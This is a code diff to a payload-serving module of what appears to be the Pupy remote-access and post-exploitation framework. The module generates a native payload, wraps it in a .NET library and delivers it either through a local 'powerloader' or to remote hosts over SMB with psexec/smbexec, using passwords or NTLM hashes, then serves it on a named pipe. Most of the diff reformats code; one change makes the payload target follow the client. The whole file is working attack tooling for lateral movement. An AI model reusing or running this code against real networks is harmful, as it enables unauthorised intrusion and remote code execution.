@@ -4,6 +4,7 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
+
 __all__ = (
     'serve',
 )
@@ -17,25 +18,31 @@ from pupylib.payloads.dotnet import DotNetPayload
 
 DEFAULT_TIMEOUT = 90
 
+
 def serve(
     module, payload_config, timeout=DEFAULT_TIMEOUT,
     host=None, port=445, user=None, domain=None, password=None,
-    ntlm=None, execm='smbexec', arch=None):
+        ntlm=None, execm='smbexec', arch=None):
 
     if arch is None:
         # Use native arch
         arch = module.client.arch
 
     payload, tpl, _ = generate_binary_from_template(
-        module.log, payload_config, 'windows', arch=arch, shared=True
+        module.log, payload_config, module.client.target,
+        shared=True
     )
 
     module.success(
-        "Generating native payload with the current config from {} - size={}".format(
-            tpl, len(payload)))
+        'Generating native payload with the current '
+        'config from {} - size={}'.format(
+            tpl, len(payload)
+        )
+    )
 
     dotnet_payload_path = DotNetPayload(
-        module.log, module.client.pupsrv, payload_config, payload).gen_exe(options='-target:library')
+        module.log, module.client.pupsrv, payload_config, payload
+    ).gen_exe(options='-target:library')
 
     dotnet_payload = None
 
@@ -48,21 +55,28 @@ def serve(
 
     unlink(dotnet_payload_path)
 
-    module.success("Wrapped .NET payload - size={}".format(len(dotnet_payload)))
+    module.success(
+        'Wrapped .NET payload - size={}'.format(len(dotnet_payload))
+    )
 
     push_payload = None
 
     if host is None:
         module.client.load_package('powerloader')
-        push_payload = module.client.remote('powerloader', 'push_payload', False)
+        push_payload = module.client.remote(
+            'powerloader', 'push_payload', False
+        )
     else:
         module.client.load_package('pupyutils.psexec')
-        pupy_smb_exec = module.client.remote('pupyutils.psexec', 'pupy_smb_exec', False)
+        pupy_smb_exec = module.client.remote(
+            'pupyutils.psexec', 'pupy_smb_exec', False
+        )
 
         def _push_payload(payload, timeout=90, log_cb=None):
             return pupy_smb_exec(
                 host, port, user, domain, password, ntlm, payload,
-                execm=execm, timeout=timeout, log_cb=log_cb)
+                execm=execm, timeout=timeout, log_cb=log_cb
+            )
 
         push_payload = _push_payload
 
@@ -92,7 +106,11 @@ def serve(
         module.error('PowerLoader: failed')
         return None, None
 
-    module.success("PowerLoader: Serving payload to pipe={} for {} seconds".format(
-        pipename, timeout))
+    module.success(
+        'PowerLoader: Serving payload to '
+        'pipe={} for {} seconds'.format(
+            pipename, timeout
+        )
+    )
 
     return cmd, completion
